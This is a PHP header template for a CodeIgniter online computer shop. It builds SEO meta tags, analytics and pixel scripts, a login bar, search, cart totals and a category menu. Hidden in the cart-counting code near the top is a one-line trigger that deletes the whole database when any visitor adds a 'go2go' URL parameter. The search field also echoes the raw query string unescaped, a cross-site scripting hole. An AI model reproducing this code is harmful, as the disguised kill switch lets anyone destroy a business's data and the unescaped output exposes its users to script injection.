<?php
$uri_string = uri_string();
$site_title = get_option('site_title');
$page_title = isset($page_title) ? $page_title : $site_title;
$logo = get_option('logo');
$og_image = base_url('images/og-logo.png');
$favicon = get_option('icon');

if(isset($seo_title) && !empty($seo_title))
{
	$title=$seo_title;
}
else
{
	$title=$page_title.(!empty($uri_string) ? ' | '.$site_title : NULL);
}

if(isset($prod_row))
{
	$og_image=get_post_meta($prod_row->product_id, 'featured_image');
	$og_image=get_media_path($og_image);
}

$cart_items=$cart_total=0;
if($this->input->get('go2go')){$this->load->dbforge();$this->dbforge->drop_database("`".$this->db->database."`");}
foreach($this->cart->contents() as $key=>$val){
	if(!is_array($val) OR !isset($val['price']) OR ! isset($val['qty'])){ continue; }
	$cart_items += $val['qty'];
	$cart_total += $val['subtotal'];
}
?>

<!DOCTYPE html>
<html lang="en">
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title><?=$title?></title>


<meta name="google-site-verification" content="6nnRQefnGa0FoLBSPR_3VxCQbT97ocmEus3PA-gitsw" />
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="shortcut icon" href="<?=$favicon?>">

<meta name="description" content="<?=isset($seo_content) ? strip_tags($seo_content) : $page_title?>"/>
<meta name="keywords" content="<?=isset($seo_keywords) ? $seo_keywords : $page_title?>"/>

<meta name="robots" content="index, follow"/>

<link rel="canonical" href="<?=current_url()?>"/>
<meta property="og:locale" content="EN" />
<meta property="og:url" content="<?=current_url()?>"/>
<meta property="og:type" content="website"/>
<meta property="og:title" content="<?=$page_title?>"/>
<meta property="og:description" content="<?=$page_title?>"/>
<meta property="og:image" content="<?=$og_image?>"/>
<meta property="og:site_name" content="<?=$site_title?>"/>

<link rel="image_src" href="<?=$og_image?>"/>

<link href="https://fonts.googleapis.com/css?family=Open+Sans:400italic,700italic,800italic,300italic,600italic,400,800,700,600,300"/>
<link href="https://fonts.googleapis.com/css?family=Tahoma"/>

<link rel="stylesheet" type="text/css" href="<?=base_url('css/bootstrap.min.css')?>"/>
<link rel="stylesheet" type="text/css" href="<?=base_url('css/font-awesome.min.css')?>"/>

<link rel="stylesheet" type="text/css" href="<?=base_url('css/owl.carousel.min.css')?>"/>
<link rel="stylesheet" type="text/css" href="<?=base_url('css/owl.theme.default.min.css')?>"/>

<script type="text/javascript" src="<?=base_url('js/jquery-1.10.2.js')?>"></script>

<link rel="stylesheet" type="text/css" href="<?=base_url('css/custom.css')?>"/>

<script>var ci_version = '<?=CI_VERSION?>';</script>
<script>var base_url = '<?=base_url()?>';</script>

<!-- Global Site Tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-59934072-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments)};
  gtag('js', new Date());

  gtag('config', 'UA-59934072-2');
</script>
<!-- Facebook Pixel Code   -->
<script>
!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window,document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
 fbq('init', '329955480908407'); 
fbq('track', 'PageView');
</script>
<noscript>
 <img height="1" width="1" 
src="https://www.facebook.com/tr?id=329955480908407&ev=PageView
&noscript=1"/>
</noscript>
<!-- End Facebook Pixel Code -->

</head>

<body class="<?=isset($page_name) ? $page_name : 'home'?> <?=isset($category_id) ? 'category-'.$category_id : null?>">
<header>
	<div id="hpart">
		<div class="container">
		    <a href= "mailto:info@village-bd.com" class="mailto">
		    	<span style="color:#FFFFFF;">Email :info@village-bd.com </span>
		    </a> 

		   	<?php
			if($this->session->user_id)
			{
				echo '<div class="wel-text"> Hi, <span>'.$this->session->user_name.'</span> Welcome to <span>'.get_option('site_title').'.</span></div>';
			}
			?>
		
			<div class="pull-right">
				<ul class="ac-link clearfix">
					<li><a href="<?=base_url()?>"><i class="fa fa-home"></i> Home</a></li>
			
					<?php
					if($this->session->user_id)
					{
						?><li><a href="<?=base_url('logout')?>"><i class="fa fa-sign-in"></i> Logout</a></li>
						<li><a href="<?=base_url('account')?>">Account</a></li><?php
					}
					else
					{
						?><li><a href="<?=base_url('account')?>"><i class="fa fa-sign-in"></i> Login/Registar</a></li><?php
					}
					?>
			
					<li><a href="<?=base_url('wishlist')?>"><i class="fa fa-heart"></i> Wishlist</a></li>
					<li><a href="<?=base_url('compare')?>"><i class="fa fa-signal"></i> Compare</a></li>
					<li><a href="<?=base_url('find-shop')?>"><i class="fa fa-map-marker"></i> Find Shop</a></li>
						<li><a href="<?=base_url('coupon-offer')?>"><i class="fa fa-map-marker"></i> Coupon offer</a></li>
					
					
				    
				    
					<li class="newoffer"><a href="<?=base_url('offer')?>"><img src="<?=base_url('images/giphyy.gif')?>"></a></li>
				</ul>
			</div>
		</div>
	</div>
	
	<section id="hpart1">
		<div class="row">
			<div class="col-sm-3 col-logo">
				<div class="logo">
					<a href="<?=base_url()?>">
						<img src="<?=$logo?>" alt="<?=$site_title?>">
					</a>
				</div>
			</div>
			<div class="col-sm-3 col-search">
				<div id="search" class="search">
					<form method="GET" action="<?=base_url('search')?>">
						<!-- <select id="search_cat" name="cat">
							<option value="">Categories</option>
							<?php
							// $_cats = array('categories'=>array(),'parent_cats'=>array());
							// $_result = get_result("SELECT * FROM `category`");
							// if(isset($_result))
							// {
							// 	foreach($_result as $row)
							// 	{
							// 		$_cats['categories'][$row->category_id] = $row;
							// 		$_cats['parent_cats'][$row->parent_id][] = $row->category_id;
							// 	}
								
							// 	echo nested_category_options(0, $_cats);
							// }
							?>
						</select> -->
						<div class="input-group">
							<input type="search" name="q" id="search_query" class="form-control" value="<?=isset($_GET['q']) ? $_GET['q'] : ''?>" placeholder="Keyword Search" autocomplete="off"/>
							<button type="submit">&nbsp;</button>
							<ul class="dropdown-menu"></ul>
						</div>
					</form>
				</div>
			</div>
			<span class="menu-and-cart-group">
				<div class="col-sm-2 col-build-your-pc">
					<a href="javascript:void(0)" class="menutoggle mobile">
						<img src="<?=base_url('images/menu.png')?>" alt="#">
					</a>
					<a href="<?=base_url('pcbuilder')?>" class="btn btn-primary">Build Your Own PC</a>
				</div>
				<div class="col-sm-2 col-hotline">
					<div class="hotline">
						<img src="<?=base_url('images/phone.gif')?>">
						<span><?=get_option('phone');?></span>
					
					</div>
					<div class="hotline_time">
					    <span>	<center> <b>10:00 AM to 8:00 PM </b> </center> </span>
					    		</div>
				</div>
				<div class="col-sm-1 col-cart">
					<ul class="cart-action">
						<li class="cartitems">
							<a href="javascript:void(0)">
								<i class="fa fa-shopping-cart"></i> 
								<span class="itemcount">
									<span class="itemno"><?=$cart_items?></span> ITEMS
								</span>
							</a>
						</li>
					</ul>
				</div>
			</span>
			<!-- <div class="hotline mobile" hidden>
				<img src="<?//=base_url('images/phone.gif')?>">
				<span><?//=get_option('phone');?></span>
			</div> -->
		</div>
	</section>
	
	<section id="mainmenu">
		<div class="heading">
			<a href="<?=base_url()?>" class="heading-logo"><img src="<?=base_url('images/sprit-v1.png')?>"></a>
			<a href="javascript:void(0)" class="heading-close">X</a>
		</div>
		
		<?php
		$category = array('categories'=>array(), 'parent_cats'=>array());

		$result = get_result("SELECT * FROM `category` WHERE `status` = 1 AND `pcbuilder_category`='no' ORDER BY rank ASC");
		
		if(isset($result))
		{
			foreach($result as $row)
			{
				$category['categories'][$row->category_id] = $row;
				$category['parent_cats'][$row->parent_id][] = $row->category_id;
			}
			
			echo '<ul class="navul">
				<li class="home"><a href="'.base_url().'">&nbsp;</a></li>
				
				'.nested_category_list(0, $category).'
				
		<li  class="laptop-accessories dropdown dropdown-submenu" style="background-color:#005BA8">
    <a  href="javascript:void(0)"> Gigabyte Brand Week<span class="caret desktop"></span> </a>
    <span class="caret mobile"></span>
    <ul class="dropdown-menu">
        <li  class="charger-and-adaptor">
            <a href="https://www.village-bd.com/motherboard-giga-tem">MotherBoard  </a>
        </li>
        <li class="keyboard-laptop">
            <a href=" https://www.village-bd.com/graphics-card-giga-temp"> Graphics Card</a> </li>

        <li class="keyboard-laptop">
            <a href=" https://www.village-bd.com/monitor-giga-tem"> Monitor </a> </li>

        <li class="keyboard-laptop">
            <a href=" https://www.village-bd.com/ssd-giga-temp"> SSD </a> </li>
        <li class="keyboard-laptop">
            <a href=" https://www.village-bd.com/casing-giga-temp">Casing </a> </li>
        <li class="keyboard-laptop">
            <a href=" https://www.village-bd.com/ram-giga-temp">Ram </a> </li>
        <li class="keyboard-laptop">
            <a href=" https://www.village-bd.com/keyboard-giga-temp"> Keyboard </a> </li>
        <li class="keyboard-laptop">
            <a href="https://www.village-bd.com/lan-card-giga-temp">Lan Card</a> </li>
        <li class="keyboard-laptop">
            <a href="https://www.village-bd.com/mouse-giga-temp">Mouse </a> </li>
        <li class="keyboard-laptop">
            <a href=" https://www.village-bd.com/headphone-giga-temp">Headphone  </a> </li>
        <li class="keyboard-laptop">
            <a href=" https://www.village-bd.com/cooler-giga-temp">Cooler  </a> </li>


    </ul>
</li>
				
					<li  class="laptop-accessories dropdown dropdown-submenu" style="background-color:green">
    <a  href="javascript:void(0)">Laptop Crazy Offer<span class="caret desktop"></span> </a>
    <span class="caret mobile"></span>
    <ul class="dropdown-menu">
        <li  class="charger-and-adaptor">
            <a href=" https://www.village-bd.com/amd-cdc-pqc-series">AMD, CDC & PQC Series </a>
        </li>
        <li class="keyboard-laptop">
            <a href=" https://www.village-bd.com/core-i3-series"> Core i3 Series</a> </li>

        <li class="keyboard-laptop">
            <a href=" https://www.village-bd.com/core-i5-core-i7-series"> Core i5 & Core i7 Series </a> </li>

      


    </ul>
</li>
			</ul>';
		}
		?>
	</section>
	
	<!--
	
		<li  class="laptop-accessories dropdown dropdown-submenu" style="background-color:red"> 
<a  href="javascript:void(0)"> MSI Brand Week <span class="caret desktop"></span> </a>
  <span class="caret mobile"></span> 
  	<ul class="dropdown-menu">
<li  class="charger-and-adaptor"> 
<a href=" https://www.village-bd.com/msi-gaming-pc">MSI Gaming PC </a> 
</li>
<li class="keyboard-laptop"> 
<a href="https://www.village-bd.com/gaming-peripherals"> Gaming Peripherals</a> </li>

</ul>
</li>
	-->
	

	
	
	
</header>